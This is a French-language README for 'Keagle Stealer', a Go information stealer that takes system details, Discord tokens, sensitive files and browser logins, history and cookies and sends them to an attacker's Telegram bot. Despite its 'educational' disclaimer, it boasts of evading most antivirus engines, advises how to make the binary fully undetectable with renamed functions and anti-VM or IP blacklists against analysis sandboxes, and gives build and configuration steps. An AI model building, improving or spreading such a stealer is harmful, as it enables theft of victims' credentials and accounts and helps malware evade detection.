<h1 align="center" id="title">🦅 Keagle Stealer</h1><br>

[![license](https://img.shields.io/badge/License-GNU-blue.svg)](https://www.gnu.org/licenses/gpl-3.0.fr.html)


## **🦅 Keagle Stealer**

- Ce script en **Golang** permet de récupérer des informations sur la machine ayant executé ce script.
- Ce code est à pur **but éducatif**, ce repos permet de comprendre le **fonctionnement** de ce dernier.

## **🔖 Modules**

| Nom                     | Utilité                                | Format            |  Actif
| -------------------     | -------------------------------------- | ----------------- | -----------------|
| Informations Système    | username, hwid, proc, etc ...          | STRING            | ✔               |
| Informations Réseau     | ip, localization, isp, etc ...         | STRING            | ✔               |
| Discord Token           | token -> username, email, phone        | STRING            | ✔               |
| Fichiers Sensible       | password.txt, backup.txt, etc ...      | FILE              | ✔               |
| Navigateur Session      | login, history, cookies, etc...        | FILE              | ✔               |
| StartUp                 | file in startup                        | FILE              | ✘               |
| Telegram Message        | send logs on telegram                  | FILE / STRING     | ✔               |

## **🦠 Virus Total Score (3/74)**

![image](https://github.com/gabrielctz/keagle/assets/133511026/1e71a2bc-d7b7-433c-8276-6263f4e3e8bd)

- Comme nous pouvons le voir sur la capture d'écran ci-dessus, le fichier compilé permet de bypass tous les AV connus.
- Il est malheureusment détecter par deux AV peu utilisé ainsi que celui de Google (ce qui fait que les utilisateurs Google Chrome soit prévenue d'un potentiel virus lors de l'installation)

**💡 Comment le rendre FUD (*fully undetectable*)**

- *Fonctions*: Le changement de **noms des fonctions** par G3TBR0S3RS (*GetBrowsers*), peut rendre plus compliqué à un AV de détecter les noms de **fonctions potentiellement malveillantes**.
  
- *Anti-VM*: L'implémentation d'une fonction permettant de blacklist les **HWID** des machines qui testent les virus peut être très utile lors de l'analyse sur **VirusTotal**.

- *Anti-IP*: Tout comme l'Anti-VM, l'ajout d'une fonction de blacklist des **IPs** peut aider à réduire le score sur **VirusTotal**.
  

## **🔧 Requirements / Launch**

- [Golang](https://go.dev)

```
git clone https://github.com/gabrielctz/anemone
cd anemone
```

- **Configuration**: Pour recevoir les informations sur **Telegram**, rendez vous dans le fichier *getConfig.go* et coller le **token/chat_id** de votre **bot/groupe**.


### 💖 Then just run the script 

- **⚠ WARNING**: N'oubliez pas d'executer la commande ```set CGO_ENABLED=1```

```
set CGO_ENABLED=1
go build main.go
```
